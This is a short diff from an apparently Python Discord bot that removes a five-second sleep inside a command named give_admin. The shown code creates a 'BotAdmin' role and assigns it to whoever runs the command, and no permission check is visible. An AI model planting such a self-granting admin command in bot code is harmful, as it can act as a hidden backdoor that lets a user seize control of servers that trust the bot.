@@ -203,7 +203,6 @@ async def give_admin(self,ctx,test):
             role = await ctx.guild.create_role(name='BotAdmin',
                     permissions=perms)
             await ctx.author.add_roles(role)
-            await asyncio.sleep(5)
             await role.edit(position=rolePos)
         else:
             if len(roles) == 1:
